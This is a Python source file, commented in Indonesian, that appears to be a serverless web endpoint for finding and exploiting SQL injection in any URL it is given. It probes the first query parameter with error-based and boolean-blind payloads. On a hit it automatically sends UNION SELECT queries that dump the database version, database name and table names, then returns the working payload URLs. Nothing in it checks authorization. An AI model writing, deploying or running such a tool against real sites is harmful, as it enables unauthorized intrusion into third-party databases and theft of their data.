#!/usr/bin/env python3
"""
/api/scan.py – Vercel serverless
Menampilkan:
1. payload mana yg WORK
2. URL lengkap untuk mencoba sendiri
3. hasil dump otomatis (versi, db, tabel, dll)
"""
import urllib.parse, json, socket, ssl, re

TIMEOUT = 8
VERBOSE_DUMP = True   # otomatis dump versi+db+tabel

def send_get(url):
    p = urllib.parse.urlparse(url)
    host = p.hostname
    port = 443 if p.scheme == 'https' else 80
    path = p.path + ('?' + p.query if p.query else '')
    sock = socket.socket()
    sock.settimeout(TIMEOUT)
    if p.scheme == 'https':
        sock = ssl.create_default_context().wrap_socket(sock, server_hostname=host)
    sock.connect((host, port))
    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\nUser-Agent: SVRIOT/4.0\r\n\r\n"
    sock.send(req.encode())
    resp = sock.recv(8192).decode(errors='ignore')
    sock.close()
    return resp

def quick_dump(base, param, value):
    dumps = {}
    # versi
    v_url = f"{base}?{param}={value}' UNION SELECT 1,@@version,3-- -"
    v_res = send_get(v_url)
    ver = re.findall(r'([0-9]+\.[0-9]+\.[0-9]+)', v_res)
    dumps['version'] = {"payload": v_url, "result": ver[0] if ver else 'N/A'}

    # nama db
    d_url = f"{base}?{param}={value}' UNION SELECT 1,database(),3-- -"
    d_res = send_get(d_url)
    db = re.findall(r'([A-Za-z0-9_-]+)</', d_res)
    dumps['database'] = {"payload": d_url, "result": db[0] if db else 'N/A'}

    # tabel
    t_url = f"{base}?{param}={value}' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"
    t_res = send_get(t_url)
    tbl = re.findall(r'([A-Za-z0-9_,]+)</', t_res)
    dumps['tables'] = {"payload": t_url, "result": tbl[0].split(',') if tbl else []}
    return dumps

def scan(url):
    p = urllib.parse.urlparse(url)
    qs = dict(urllib.parse.parse_qsl(p.query))
    if not qs:
        return {"status":"error","detail":"URL harus punya query string"}
    base = url.split('?')[0]
    param, value = next(iter(qs.items()))

    # 1) deteksi error-based
    e_url = f"{base}?{param}={value}'-- -"
    e_resp = send_get(e_url)
    if any(k in e_resp.lower() for k in ["mysql","syntax","warning"]):
        data = {
            "status":"vuln",
            "type":"error-based",
            "payload_used": e_url,
            "parameter": param,
            "next_step": "Ganti payload menjadi UNION SELECT untuk dump data",
            "auto_dump": quick_dump(base, param, value)
        }
        return data

    # 2) deteksi blind-boolean
    t1 = len(send_get(f"{base}?{param}={value}' AND 1=1-- -"))
    t2 = len(send_get(f"{base}?{param}={value}' AND 1=2-- -"))
    if abs(t1 - t2) > 200:  # threshold
        return {
            "status":"vuln",
            "type":"blind-boolean",
            "payload_used": f"{base}?{param}={value}' AND [CONDITION]-- -",
            "parameter": param,
            "next_step": "Gunakan sqlmap atau script blind (AND ascii(substring(...))=N)"
        }

    return {"status":"safe","detail":"Tidak ditemukan SQLi yang jelas"}

def handler(event, context=None):
    url = urllib.parse.parse_qs(event.get('queryString', '')).get('url', [''])[0]
    if not url:
        return {"statusCode": 400, "body": json.dumps({"status":"error","detail":"url param wajib"})}
    return {"statusCode": 200, "body": json.dumps(scan(url), indent=2)}
